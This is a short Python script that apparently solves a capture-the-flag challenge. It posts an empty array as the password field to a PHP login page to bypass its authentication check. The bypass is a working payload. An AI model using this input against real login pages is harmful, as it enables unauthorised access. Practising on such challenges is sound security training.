import requests

r = requests.post('http://ctfq.sweetduet.info:10080/~q32/auth.php', data = {'password[]':''})
print (r.text)